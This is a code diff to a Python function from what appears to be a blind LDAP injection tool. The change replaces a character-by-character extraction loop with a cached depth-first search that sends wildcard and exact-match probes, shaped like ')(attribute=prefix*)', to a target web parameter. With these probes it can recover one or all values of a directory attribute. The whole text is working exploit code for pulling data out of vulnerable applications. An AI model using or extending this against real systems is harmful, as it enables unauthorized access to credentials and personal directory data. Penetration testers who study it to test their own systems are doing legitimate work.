@@ -362,23 +362,17 @@ def extract_attribute(
     use_json: bool = False,
     true_statuses: set[int] | None = None,
     false_statuses: set[int] | None = None,
-) -> str:
+    exclude_value: str | None = None,
+    find_all: bool = False,
+) -> str | list[str]:
     """
-    Extract the value of *attribute* one character at a time using LDAP wildcards.
+    Extract one or more values of *attribute* using LDAP wildcard probes.
 
-    For each position the function tries every character in CHARSET by sending
-    a payload of the form:
-        )(attribute=<known_prefix><candidate>*)
-
-    When the response looks "true" the candidate character is appended to the
-    known prefix and the search moves to the next position.
-
-    The discovered value is printed incrementally to stdout.
-
-    Returns the fully extracted value string.
+    The search can skip a known value via *exclude_value* and can enumerate all
+    candidate values when *find_all* is True. Prefix and exact probes are cached
+    so repeated checks are not re-requested.
     """
     print(f"\n[*] --- Extraction Phase: {attribute} ---")
-    extracted = ""
     print(f"  [*] Extracting {attribute}: ", end="", flush=True)
     status_true_set = true_statuses if true_statuses is not None else {true_status}
     working_template = _discover_working_template_for_attribute(
@@ -398,41 +392,115 @@ def extract_attribute(
             f"\n  [!] Could not determine a working injection template for attribute '{attribute}'.",
             file=sys.stderr,
         )
-        return ""
+        return [] if find_all else ""
 
-    while True:
-        found_char = False
-        for char in CHARSET:
-            payload = working_template.format(attr=attribute, value=f"{extracted}{char}")
-            classification, resp = _classify_attribute_payload(
-                session,
-                url,
-                base_data,
-                param,
-                payload,
-                status_true_set,
-                true_length,
-                verbose,
-                use_json,
-                false_statuses,
+    exact_template = working_template.replace("{value}*", "{value}")
+    prefix_cache: dict[str, bool] = {}
+    exact_cache: dict[str, bool] = {}
+    children_cache: dict[str, list[str]] = {}
+
+    def matches_prefix(prefix: str) -> bool:
+        if prefix in prefix_cache:
+            return prefix_cache[prefix]
+        payload = working_template.format(attr=attribute, value=prefix)
+        classification, resp = _classify_attribute_payload(
+            session,
+            url,
+            base_data,
+            param,
+            payload,
+            status_true_set,
+            true_length,
+            verbose,
+            use_json,
+            false_statuses,
+        )
+        if classification == "error" and resp is not None:
+            print(
+                f"\n  [!] Unexpected HTTP {resp.status_code} while testing {attribute} "
+                f"prefix '{prefix}' (classified as ERROR)",
+                file=sys.stderr,
             )
-            if resp is None:
-                continue
-            if classification == "true":
-                extracted += char
-                print(char, end="", flush=True)
-                found_char = True
-                break  # Move to next position
-            if classification == "error":
-                print(
-                    f"\n  [!] Unexpected HTTP {resp.status_code} while testing {attribute} "
-                    f"prefix '{extracted}{char}' (classified as ERROR)",
-                    file=sys.stderr,
-                )
+        prefix_cache[prefix] = classification == "true"
+        return prefix_cache[prefix]
 
-        if not found_char:
-            # No character matched — value is fully extracted
-            break
+    def is_exact_value(candidate: str) -> bool:
+        if candidate in exact_cache:
+            return exact_cache[candidate]
+        payload = exact_template.format(attr=attribute, value=candidate)
+        classification, resp = _classify_attribute_payload(
+            session,
+            url,
+            base_data,
+            param,
+            payload,
+            status_true_set,
+            true_length,
+            verbose,
+            use_json,
+            false_statuses,
+        )
+        if classification == "error" and resp is not None:
+            print(
+                f"\n  [!] Unexpected HTTP {resp.status_code} while testing exact {attribute} "
+                f"value '{candidate}' (classified as ERROR)",
+                file=sys.stderr,
+            )
+        exact_cache[candidate] = classification == "true"
+        return exact_cache[candidate]
 
-    print()  # Newline after the extracted value
-    return extracted
+    def next_chars(prefix: str) -> list[str]:
+        if prefix in children_cache:
+            return children_cache[prefix]
+        matches: list[str] = []
+        for char in CHARSET:
+            if matches_prefix(f"{prefix}{char}"):
+                matches.append(char)
+        children_cache[prefix] = matches
+        return matches
+
+    found_values: list[str] = []
+    stack: list[str] = [""]
+    seen_prefixes: set[str] = set()
+
+    while stack:
+        prefix = stack.pop()
+        if prefix in seen_prefixes:
+            continue
+        seen_prefixes.add(prefix)
+
+        child_chars = next_chars(prefix)
+        for char in reversed(child_chars):
+            child_prefix = f"{prefix}{char}"
+
+            # After each discovered character, test exact match.
+            if is_exact_value(child_prefix):
+                if exclude_value is None or child_prefix != exclude_value:
+                    found_values.append(child_prefix)
+                    if not find_all:
+                        print(child_prefix, end="", flush=True)
+                        print()
+                        return child_prefix
+                # Even when exact, continue exploring deeper values
+                # that share the same prefix.
+            if child_prefix not in seen_prefixes:
+                stack.append(child_prefix)
+
+        if prefix and not child_chars:
+            # Terminal prefix fallback: when no longer prefix matches exist,
+            # treat it as a candidate value even if exact probes are not
+            # supported by the target query construction.
+            if exclude_value is None or prefix != exclude_value:
+                if prefix not in found_values:
+                    found_values.append(prefix)
+                    if not find_all:
+                        print(prefix, end="", flush=True)
+                        print()
+                        return prefix
+
+    if find_all:
+        print()
+        return found_values
+
+    print()
+    return ""
